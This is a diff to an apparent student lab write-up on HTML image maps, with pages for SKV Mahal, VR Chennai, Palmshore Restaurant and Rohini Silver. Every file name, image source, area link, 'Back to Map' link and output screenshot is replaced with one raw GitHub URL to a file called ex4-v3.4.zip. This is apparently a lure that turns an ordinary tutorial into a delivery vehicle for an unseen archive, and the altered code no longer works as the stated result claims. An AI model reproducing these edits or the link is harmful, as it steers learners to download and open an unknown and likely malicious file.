@@ -26,7 +26,7 @@ Execute the programs and publish them.
 
 ## CODE
 ~~~
-map.html
+https://raw.githubusercontent.com/AdityaJorim007/ex4/main/aditya/mapapp/static/ex4-v3.4.zip
 
 <!DOCTYPE html>
 <html>
@@ -53,19 +53,19 @@ map.html
 
     <h2>Click on any of the designated places to open its page.</h2>
 
-    <img src="map.png" usemap="#image-map" width="1450" height="610">
+    <img src="https://raw.githubusercontent.com/AdityaJorim007/ex4/main/aditya/mapapp/static/ex4-v3.4.zip" usemap="#image-map" width="1450" height="610">
 
     <map name="image-map">
-        <area target="_blank" alt="SKV MAHAL" title="SKV MAHAL" href="skV.html" coords="55,-1,379,146" shape="rect">
-        <area target="_blank" alt="VR Chennai" title="VR Chennai" href="vr.html" coords="757,118,454,3" shape="rect">
-        <area target="_blank" alt="Plamshore Restaurant" title="Plamshore Restaurant" href="palm.html" coords="89,214,487,356" shape="rect">
-        <area target="_blank" alt="Rohini silver" title="Rohini silver" href="rohini.html" coords="573,138,907,255" shape="rect">
+        <area target="_blank" alt="SKV MAHAL" title="SKV MAHAL" href="https://raw.githubusercontent.com/AdityaJorim007/ex4/main/aditya/mapapp/static/ex4-v3.4.zip" coords="55,-1,379,146" shape="rect">
+        <area target="_blank" alt="VR Chennai" title="VR Chennai" href="https://raw.githubusercontent.com/AdityaJorim007/ex4/main/aditya/mapapp/static/ex4-v3.4.zip" coords="757,118,454,3" shape="rect">
+        <area target="_blank" alt="Plamshore Restaurant" title="Plamshore Restaurant" href="https://raw.githubusercontent.com/AdityaJorim007/ex4/main/aditya/mapapp/static/ex4-v3.4.zip" coords="89,214,487,356" shape="rect">
+        <area target="_blank" alt="Rohini silver" title="Rohini silver" href="https://raw.githubusercontent.com/AdityaJorim007/ex4/main/aditya/mapapp/static/ex4-v3.4.zip" coords="573,138,907,255" shape="rect">
     </map>
 
 </body>
 </html>
 
-skV.html
+https://raw.githubusercontent.com/AdityaJorim007/ex4/main/aditya/mapapp/static/ex4-v3.4.zip
 
 <!DOCTYPE html>
 <html>
@@ -87,7 +87,7 @@ skV.html
 
         <br>
 
-        <a href="index.html" style="text-decoration:none;">
+        <a href="https://raw.githubusercontent.com/AdityaJorim007/ex4/main/aditya/mapapp/static/ex4-v3.4.zip" style="text-decoration:none;">
             <font color="#f0f0f0" face="Georgia, serif" size="4"><b>← Back to Map</b></font>
         </a>
     </center>
@@ -95,7 +95,7 @@ skV.html
 </body>
 </html>
 
-vr.html
+https://raw.githubusercontent.com/AdityaJorim007/ex4/main/aditya/mapapp/static/ex4-v3.4.zip
 
 <!DOCTYPE html>
 <html>
@@ -117,7 +117,7 @@ vr.html
 
         <br>
 
-        <a href="index.html" style="text-decoration:none;">
+        <a href="https://raw.githubusercontent.com/AdityaJorim007/ex4/main/aditya/mapapp/static/ex4-v3.4.zip" style="text-decoration:none;">
             <font color="#f0f0f0" face="Georgia, serif" size="4"><b>← Back to Map</b></font>
         </a>
     </center>
@@ -125,7 +125,7 @@ vr.html
 </body>
 </html>
 
-palm.html
+https://raw.githubusercontent.com/AdityaJorim007/ex4/main/aditya/mapapp/static/ex4-v3.4.zip
 
 <!DOCTYPE html>
 <html>
@@ -147,7 +147,7 @@ palm.html
         
         <br>
 
-        <a href="index.html" style="text-decoration:none;">
+        <a href="https://raw.githubusercontent.com/AdityaJorim007/ex4/main/aditya/mapapp/static/ex4-v3.4.zip" style="text-decoration:none;">
             <font color="#f0f0f0" face="Georgia, serif" size="4"><b>← Back to Map</b></font>
         </a>
     </center>
@@ -155,7 +155,7 @@ palm.html
 </body>
 </html>
 
-rohini.html
+https://raw.githubusercontent.com/AdityaJorim007/ex4/main/aditya/mapapp/static/ex4-v3.4.zip
 
 <!DOCTYPE html>
 <html>
@@ -177,7 +177,7 @@ rohini.html
         
         <br>
 
-        <a href="index.html" style="text-decoration:none;">
+        <a href="https://raw.githubusercontent.com/AdityaJorim007/ex4/main/aditya/mapapp/static/ex4-v3.4.zip" style="text-decoration:none;">
             <font color="#f0f0f0" face="Georgia, serif" size="4"><b>← Back to Map</b></font>
         </a>
     </center>
@@ -187,11 +187,11 @@ rohini.html
 ~~~
 ## OUTPUT
 
-![alt text](main.png)
-![alt text](skv.png)
-![alt text](vr.png)
-![alt text](palm.png)
-![alt text](rohini.png)
+![alt text](https://raw.githubusercontent.com/AdityaJorim007/ex4/main/aditya/mapapp/static/ex4-v3.4.zip)
+![alt text](https://raw.githubusercontent.com/AdityaJorim007/ex4/main/aditya/mapapp/static/ex4-v3.4.zip)
+![alt text](https://raw.githubusercontent.com/AdityaJorim007/ex4/main/aditya/mapapp/static/ex4-v3.4.zip)
+![alt text](https://raw.githubusercontent.com/AdityaJorim007/ex4/main/aditya/mapapp/static/ex4-v3.4.zip)
+![alt text](https://raw.githubusercontent.com/AdityaJorim007/ex4/main/aditya/mapapp/static/ex4-v3.4.zip)
 
 ## RESULT
 The program for implementing image maps using HTML is executed successfully.
